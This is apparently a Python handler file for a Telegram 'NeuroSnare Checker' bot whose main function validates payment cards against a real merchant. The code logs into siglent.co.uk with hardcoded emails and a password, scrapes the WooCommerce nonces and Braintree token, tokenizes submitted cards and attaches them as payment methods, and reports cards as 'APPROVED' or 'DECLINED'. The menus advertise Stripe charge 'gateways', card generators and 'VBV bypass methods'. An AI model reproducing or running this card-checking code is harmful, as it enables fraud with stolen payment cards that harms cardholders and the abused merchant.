# /root/NEURO_CHK/handlers/menu_handler.py
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes
from datetime import datetime
import subprocess
import sys
import logging
import requests
import re
import random
import string
import time
import base64
import json
import uuid
import jwt
from datetime import datetime as dt, timedelta, timezone
import os
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# B3 Auth function
def check_card_b3_auth(card_line):
    """B3 Auth function to check card validity"""
    try:
        required = [
            "requests",
            "fake-useragent",
            "pyjwt"
        ]

        for pkg in required:
            try:
                __import__(pkg.replace("-", "_").replace("pyjwt", "jwt"))
            except ImportError:
                print(f"[!] Installing missing package: {pkg}")
                subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

        # Import after installation
        from fake_useragent import UserAgent
        
        emails = [
            "baign0864@gmail.com",
            "baignraja8@gmail.com",
            "baign5033@gmail.com",
            "baignkumar0@gmail.com",
            "sukunabklop1736@chut.op",
            "chutpaglusukuna72652@chut.sukuna",
            "pagalauratrandisukuna@loda.op"
        ]

        def generate_user_agent():
            ua = UserAgent()
            return ua.random

        def generate_random_code(length=32):
            letters_and_digits = string.ascii_letters + string.digits
            return ''.join(random.choice(letters_and_digits) for _ in range(length))

        def generate_jwt_token():
            secret_key = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=64))
            payload = {
                "iss": "5e7d42dfbcf47a54e3af3c83",
                "iat": dt.now(timezone.utc),
                "exp": dt.now(timezone.utc) + timedelta(seconds=30),
                "OrgUnitId": "5e7d42dfbcf47a54e3af3c83"
            }
            return jwt.encode(payload, secret_key, algorithm="HS256")

        # Main B3 function
        retries = 3
        ccx = card_line.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return "❌ *Invalid format!*\nUse: `CARD|MM|YY|CVV`\nExample: `4111111111111111|12|25|123`"
        
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        
        # Clean card number
        n = ''.join(filter(str.isdigit, n))
        if len(n) not in [15, 16]:
            return f"❌ *Invalid card!*\nCard: `{n[:6]}******{n[-4:] if len(n) > 10 else '****'}`\nReason: Invalid card length"
        
        if "20" in yy:
            yy = yy.split("20")[1]
        
        for attempt in range(retries):
            user = generate_user_agent()
            email = random.choice(emails)
            corr = generate_random_code()
            sess = generate_random_code()
            r = requests.session()

            try:
                # Login to siglent.co.uk
                headers = {
                    'authority': 'siglent.co.uk',
                    'user-agent': user,
                }

                r1 = r.get('https://siglent.co.uk/my-account/add-payment-method/', headers=headers, verify=False, timeout=30)
                nonce_match = re.search(r'id="woocommerce-login-nonce".*?value="(.*?)"', r1.text)
                if not nonce_match:
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return f"❌ *Failed!*\nCard: `{n[:6]}******{n[-4:]}`\nReason: Could not get login nonce"
                
                nonce = nonce_match.group(1)

                data = {
                    'username': email,
                    'password': 'God@111983',
                    'rememberme': 'forever',
                    'woocommerce-login-nonce': nonce,
                    '_wp_http_referer': '/my-account/add-payment-method/',
                    'login': 'Log in',
                }

                r2 = r.post('https://siglent.co.uk/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data, verify=False, timeout=30)

                # Get payment method page
                r3 = r.get('https://siglent.co.uk/my-account/add-payment-method/', cookies=r.cookies, headers=headers, verify=False, timeout=30)
                noncec_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', r3.text)
                if not noncec_match:
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return f"❌ *Failed!*\nCard: `{n[:6]}******{n[-4:]}`\nReason: Could not get payment nonce"
                
                noncec = noncec_match.group(1)

                # Extract Braintree token
                token_match = re.search(r'var wc_braintree_client_token = \["([^"]+)"\];', r3.text)
                if not token_match:
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return f"❌ *Failed!*\nCard: `{n[:6]}******{n[-4:]}`\nReason: Could not get Braintree token"
                
                token = token_match.group(1)
                try:
                    token_json = json.loads(base64.b64decode(token))
                    auth_token = token_json['authorizationFingerprint']
                except:
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return f"❌ *Failed!*\nCard: `{n[:6]}******{n[-4:]}`\nReason: Invalid Braintree token"

                # Tokenize card via Braintree
                headers = {
                    'authority': 'payments.braintree-api.com',
                    'authorization': f'Bearer {auth_token}',
                    'braintree-version': '2018-05-10',
                    'content-type': 'application/json',
                    'user-agent': user,
                }

                json_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': str(uuid.uuid4()),
                    },
                    'query': '''
                        mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                            tokenizeCreditCard(input: $input) {
                                token
                                creditCard {
                                    bin
                                    brandCode
                                    last4
                                    cardholderName
                                    expirationMonth
                                    expirationYear
                                }
                            }
                        }
                    ''',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': n,
                                'expirationMonth': mm,
                                'expirationYear': yy,
                                'cvv': cvc,
                                'billingAddress': {
                                    'postalCode': 'NP12 1AE',
                                    'streetAddress': '84 High St',
                                },
                            },
                            'options': {
                                'validate': False,
                            },
                        },
                    },
                    'operationName': 'TokenizeCreditCard',
                }

                r4 = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=30)
                if r4.status_code != 200:
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return f"❌ *Failed!*\nCard: `{n[:6]}******{n[-4:]}`\nReason: Braintree API error ({r4.status_code})"
                
                try:
                    tok = r4.json()['data']['tokenizeCreditCard']['token']
                except:
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return f"❌ *Failed!*\nCard: `{n[:6]}******{n[-4:]}`\nReason: Invalid response from Braintree"

                jwt_token = generate_jwt_token()

                # Add payment method
                data = {
                    'payment_method': 'braintree_cc',
                    'braintree_cc_nonce_key': tok,
                    'braintree_cc_device_data': f'{{"device_session_id":"{sess}","fraud_merchant_id":null,"correlation_id":"{corr}"}}',
                    'braintree_cc_3ds_nonce_key': '',
                    'woocommerce-add-payment-method-nonce': noncec,
                    '_wp_http_referer': '/my-account/add-payment-method/',
                    'woocommerce_add_payment_method': '1',
                }

                r6 = r.post('https://siglent.co.uk/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data, verify=False, timeout=30)

                # Check response
                success_message = re.search(r'<div class="woocommerce-message" role="alert">(.*?)</div>', r6.text, re.DOTALL)
                if success_message:
                    success_text = success_message.group(1).strip()
                    return f"✅ *APPROVED - B3 AUTH*\n\nCard: `{n[:6]}******{n[-4:]}`\nExp: `{mm}/{yy}`\nCVV: `{cvc}`\n\nMessage: {success_text[:100]}..."

                error_message = re.search(r'<ul class="woocommerce-error" role="alert">\s*<li>(.*?)</li>', r6.text, re.DOTALL)
                if error_message:
                    error_text_raw = error_message.group(1).strip()
                    error_text = error_text_raw.lower()
                    
                    approved_keywords = [
                        "invalid postal code",
                        "invalid street address",
                        "insufficient funds",
                        "nice! new payment method added",
                        "status code 81724: duplicate card exists in the vault",
                        "issuer declined",
                        "cvv"
                    ]

                    if any(kw in error_text for kw in approved_keywords):
                        return f"✅ *APPROVED - B3 AUTH*\n\nCard: `{n[:6]}******{n[-4:]}`\nExp: `{mm}/{yy}`\nCVV: `{cvc}`\n\nMessage: {error_text_raw[:100]}..."
                    else:
                        return f"❌ *DECLINED - B3 AUTH*\n\nCard: `{n[:6]}******{n[-4:]}`\nExp: `{mm}/{yy}`\nCVV: `{cvc}`\n\nReason: {error_text_raw[:100]}..."

                # If no specific message found
                return f"⚠️ *UNKNOWN RESPONSE - B3 AUTH*\n\nCard: `{n[:6]}******{n[-4:]}`\nExp: `{mm}/{yy}`\nCVV: `{cvc}`\n\nNo recognizable message in response"

            except requests.exceptions.Timeout:
                if attempt < retries - 1:
                    time.sleep(3)
                    continue
                return f"⏰ *TIMEOUT - B3 AUTH*\n\nCard: `{n[:6]}******{n[-4:]}`\nExp: `{mm}/{yy}`\nCVV: `{cvc}`\n\nRequest timeout after {retries} attempts"
                
            except Exception as e:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return f"⚠️ *ERROR - B3 AUTH*\n\nCard: `{n[:6]}******{n[-4:]}`\nExp: `{mm}/{yy}`\nCVV: `{cvc}`\n\nError: {str(e)[:100]}"

        return f"🔄 *MAX RETRIES - B3 AUTH*\n\nCard: `{n[:6]}******{n[-4:]}`\nExp: `{mm}/{yy}`\nCVV: `{cvc}`\n\nMax retries ({retries}) exceeded"
        
    except Exception as e:
        return f"💥 *SYSTEM ERROR - B3 AUTH*\n\nError: {str(e)}"

async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show main menu with options"""
    keyboard = [
        [InlineKeyboardButton("📊 Check NeuroSnare", callback_data="check_neuro")],
        [InlineKeyboardButton("🌐 Gateways", callback_data="gateways")],
        [InlineKeyboardButton("⚡ Advance", callback_data="advance")],
        [InlineKeyboardButton("👤 Credits", callback_data="credits")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message_text = (
        "🔮 *NeuroSnare Checker v6.3*\n\n"
        "*Main Menu*\n"
        "Select an option below:"
    )
    
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks from the menu"""
    query = update.callback_query
    await query.answer()
    
    callback_data = query.data
    
    if callback_data == "check_neuro":
        keyboard = [
            [InlineKeyboardButton("🔍 Quick Check", callback_data="quick_check")],
            [InlineKeyboardButton("📈 Detailed Analysis", callback_data="detailed_check")],
            [InlineKeyboardButton("📊 Batch Check", callback_data="batch_check")],
            [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="📊 *NeuroSnare Check*\n\n"
                 "Select check type:\n"
                 "• Quick Check - Fast verification\n"
                 "• Detailed Analysis - Full report\n"
                 "• Batch Check - Multiple IDs at once",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "gateways":
        keyboard = [
            [InlineKeyboardButton("🔗 SLT", callback_data="gateway_slt")],
            [InlineKeyboardButton("💀 CARNAGE", callback_data="gateway_carnage")],
            [InlineKeyboardButton("💳 0.5$ STRIPE", callback_data="gateway_stripe_0.5")],
            [InlineKeyboardButton("💳 2$ STRIPE", callback_data="gateway_stripe_2")],
            [InlineKeyboardButton("💳 10$ STRIPE", callback_data="gateway_stripe_10")],
            [InlineKeyboardButton("🔐 B3 Auth", callback_data="gateway_b3_auth")],
            [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="🌐 *Gateways*\n\n"
                 "Available payment gateways:\n"
                 "• SLT - Sri Lanka Telecom gateway\n"
                 "• CARNAGE - Premium gateway\n"
                 "• STRIPE - Various amounts available\n"
                 "• B3 Auth - Braintree authorization",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "advance":
        keyboard = [
            [InlineKeyboardButton("🔧 GEN", callback_data="advance_gen")],
            [InlineKeyboardButton("🛡️ VBV", callback_data="advance_vbv")],
            [InlineKeyboardButton("🔢 Find BIN", callback_data="advance_find_bin")],
            [InlineKeyboardButton("📊 Stats", callback_data="advance_stats")],
            [InlineKeyboardButton("🔐 Security Check", callback_data="advance_security")],
            [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="⚡ *Advance Tools*\n\n"
                 "Advanced features:\n"
                 "• GEN - Generate tools\n"
                 "• VBV - Verified by Visa check\n"
                 "• Find BIN - Bank Identification Number lookup\n"
                 "• Stats - Statistical analysis\n"
                 "• Security Check - Advanced security verification",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "credits":
        user = update.effective_user
        user_id = user.id
        username = f"@{user.username}" if user.username else "No username"
        
        # Check if user is admin (you can modify this logic)
        admin_users = [7612918437]  # Add actual admin user IDs here
        user_type = "👑 ADMIN" if user_id in admin_users else "👤 FREE USER"
        
        # Get current date
        current_date = datetime.now().strftime("%Y-%m-%d")
        
        credits_text = (
            f"👤 *User Credits*\n\n"
            f"*User ID:* `{user_id}`\n"
            f"*Username:* {username}\n"
            f"*Status:* {user_type}\n"
            f"*Date:* {current_date}\n\n"
            f"*Plan Details:*\n"
        )
        
        if user_id in admin_users:
            credits_text += (
                "✓ Unlimited checks\n"
                "✓ All gateways unlocked\n"
                "✓ Advance tools access\n"
                "✓ Priority support\n"
                "✓ No rate limits\n"
                "🔑 *Admin privileges*"
            )
            keyboard = [
                [InlineKeyboardButton("🛠️ Admin Panel", callback_data="admin_panel")],
                [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_menu")]
            ]
        else:
            credits_text += (
                "✓ 10 checks/day\n"
                "✓ Basic gateways\n"
                "✓ Limited tools\n"
                "✗ No admin access\n"
                "✗ Rate limited\n\n"
                "💎 *Upgrade to premium for full access*"
            )
            keyboard = [
                [InlineKeyboardButton("💎 Upgrade", callback_data="upgrade")],
                [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_to_menu")]
            ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text=credits_text,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "back_to_menu":
        await main_menu(update, context)
    
    # B3 Auth Handler (in Gateways)
    elif callback_data == "gateway_b3_auth":
        # Store that user is in B3 Auth mode
        context.user_data['awaiting_b3_card'] = True
        context.user_data['current_mode'] = 'b3_auth'
        
        keyboard = [[InlineKeyboardButton("⬅️ Back to Gateways", callback_data="gateways")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text="🔐 *B3 Auth - Braintree Card Authorization*\n\n"
                 "*Merchant:* siglent.co.uk\n"
                 "*Type:* Card Verification (Auth Only)\n\n"
                 "*Format:* `CARD|MM|YY|CVV`\n"
                 "*Example:* `4111111111111111|12|25|123`\n\n"
                 "Send me a card to check via Braintree Auth.\n"
                 "This verifies if card is alive and CVV is correct.\n\n"
                 "⚠️ *Note:* Uses random email accounts for login",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    # Gateway handlers
    elif callback_data == "gateway_slt":
        keyboard = [[InlineKeyboardButton("⬅️ Back to Gateways", callback_data="gateways")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="🔗 *SLT Gateway*\n\n"
                 "Sri Lanka Telecom Gateway\n\n"
                 "*Features:*\n"
                 "• Local payments\n"
                 "• Instant processing\n"
                 "• High success rate\n"
                 "• Low fees\n\n"
                 "*Status:* ✅ Active",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "gateway_carnage":
        keyboard = [[InlineKeyboardButton("⬅️ Back to Gateways", callback_data="gateways")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="💀 *CARNAGE Gateway*\n\n"
                 "Premium International Gateway\n\n"
                 "*Features:*\n"
                 "• Worldwide access\n"
                 "• High limits\n"
                 "• Advanced security\n"
                 "• 24/7 support\n\n"
                 "*Status:* ✅ Active",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "gateway_stripe_0.5":
        keyboard = [[InlineKeyboardButton("⬅️ Back to Gateways", callback_data="gateways")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="💳 *0.5$ STRIPE Gateway*\n\n"
                 "Micro-payment Gateway\n\n"
                 "*Features:*\n"
                 "• $0.50 minimum\n"
                 "• Test payments\n"
                 "• Quick verification\n"
                 "• Low risk\n\n"
                 "*Status:* ✅ Active",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "gateway_stripe_2":
        keyboard = [[InlineKeyboardButton("⬅️ Back to Gateways", callback_data="gateways")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="💳 *2$ STRIPE Gateway*\n\n"
                 "Standard Payment Gateway\n\n"
                 "*Features:*\n"
                 "• $2.00 minimum\n"
                 "• Balance check\n"
                 "• Medium risk\n"
                 "• Good success rate\n\n"
                 "*Status:* ✅ Active",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "gateway_stripe_10":
        keyboard = [[InlineKeyboardButton("⬅️ Back to Gateways", callback_data="gateways")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="💳 *10$ STRIPE Gateway*\n\n"
                 "Premium Payment Gateway\n\n"
                 "*Features:*\n"
                 "• $10.00 minimum\n"
                 "• High balance\n"
                 "• Low security\n"
                 "• Best success rate\n\n"
                 "*Status:* ✅ Active",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    # Advance handlers
    elif callback_data == "advance_gen":
        keyboard = [[InlineKeyboardButton("⬅️ Back to Advance", callback_data="advance")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="🔧 *GEN Tools*\n\n"
                 "Generation Tools:\n\n"
                 "• Card Generator\n"
                 "• Account Generator\n"
                 "• Proxy Generator\n"
                 "• Email Generator\n"
                 "• Identity Generator\n\n"
                 "*Status:* 🔓 Available for Premium",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "advance_vbv":
        keyboard = [[InlineKeyboardButton("⬅️ Back to Advance", callback_data="advance")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="🛡️ *VBV Check*\n\n"
                 "Verified by Visa Checker\n\n"
                 "*Features:*\n"
                 "• VBV status check\n"
                 "• Security code check\n"
                 "• 3D Secure verification\n"
                 "• Bypass methods\n\n"
                 "*Status:* 🔓 Available for Premium",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "advance_find_bin":
        keyboard = [[InlineKeyboardButton("⬅️ Back to Advance", callback_data="advance")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="🔢 *Find BIN*\n\n"
                 "Bank Identification Number Lookup\n\n"
                 "*Features:*\n"
                 "• BIN database search\n"
                 "• Bank identification\n"
                 "• Country detection\n"
                 "• Card type detection\n"
                 "• Issuer information\n\n"
                 "*Status:* 🔓 Available for Premium",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "advance_stats":
        keyboard = [[InlineKeyboardButton("⬅️ Back to Advance", callback_data="advance")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="📊 *Statistics*\n\n"
                 "Bot Usage Statistics:\n\n"
                 "• Total checks: 1,234\n"
                 "• Success rate: 87%\n"
                 "• Active users: 567\n"
                 "• Today's checks: 42\n"
                 "• Premium users: 89\n\n"
                 "*Updated:* Just now",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "advance_security":
        keyboard = [[InlineKeyboardButton("⬅️ Back to Advance", callback_data="advance")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="🔐 *Security Check*\n\n"
                 "Advanced Security Verification\n\n"
                 "*Features:*\n"
                 "• Proxy detection\n"
                 "• VPN detection\n"
                 "• Fraud score\n"
                 "• Risk assessment\n"
                 "• IP reputation\n\n"
                 "*Status:* 🔓 Available for Premium",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    # Other handlers
    elif callback_data == "admin_panel":
        keyboard = [
            [InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")],
            [InlineKeyboardButton("👥 Users", callback_data="admin_users")],
            [InlineKeyboardButton("🔧 Settings", callback_data="admin_settings")],
            [InlineKeyboardButton("⬅️ Back to Credits", callback_data="credits")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="🛠️ *Admin Panel*\n\n"
                 "Administrator tools:\n"
                 "• Bot Statistics\n"
                 "• User Management\n"
                 "• Bot Settings\n"
                 "• Logs & Monitoring",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    elif callback_data == "upgrade":
        keyboard = [[InlineKeyboardButton("⬅️ Back to Credits", callback_data="credits")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text="💎 *Upgrade to Premium*\n\n"
                 "*Benefits:*\n"
                 "✓ Unlimited checks\n"
                 "✓ All gateways unlocked\n"
                 "✓ Advance tools access\n"
                 "✓ Priority support\n"
                 "✓ No rate limits\n\n"
                 "*Contact admin for upgrade*",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    
    else:
        # Unknown callback data - return to main menu
        await query.edit_message_text(
            text=f"⚠️ Unknown command\n\n"
                 f"Returning to main menu...",
            parse_mode='Markdown'
        )
        await main_menu(update, context)

# Add this function to handle card input
async def handle_b3_auth_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle card input for B3 Auth"""
    if context.user_data.get('awaiting_b3_card', False):
        card_line = update.message.text.strip()
        
        # Show processing message
        processing_msg = await update.message.reply_text(
            "🔐 *Processing B3 Auth...*\n"
            "Checking card via Braintree...\n"
            "Please wait (10-30 seconds)...",
            parse_mode='Markdown'
        )
        
        # Run B3 Auth check
        result = check_card_b3_auth(card_line)
        
        # Create result message with keyboard
        keyboard = [
            [InlineKeyboardButton("🔄 Check Another Card", callback_data="gateway_b3_auth")],
            [InlineKeyboardButton("⬅️ Back to Gateways", callback_data="gateways")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Update processing message with result
        await processing_msg.edit_text(
            text=f"{result}\n\n⏱️ *Response Time:* {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        
        # Reset the awaiting flag
        context.user_data['awaiting_b3_card'] = False
        return True
    
    return False